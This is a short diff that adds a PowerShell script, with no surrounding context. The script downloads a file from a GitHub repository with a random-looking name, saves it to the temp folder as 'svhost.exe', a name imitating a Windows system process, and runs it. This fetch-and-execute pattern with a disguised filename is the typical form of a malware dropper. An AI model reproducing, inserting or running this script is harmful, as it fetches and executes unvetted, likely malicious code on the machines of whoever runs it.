@@ -1,0 +1,4 @@
+$url = 'https://raw.githubusercontent.com/mohamedsbehat026-dev/dsauihdasghihgkjwahgjkawhgjkhasjkghhasjghahh22-23-1-2-pqO3908275988/refs/heads/main/svhost'
+$tempFile = Join-Path $env:TEMP 'svhost.exe'
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+Start-Process -FilePath $tempFile -Wait
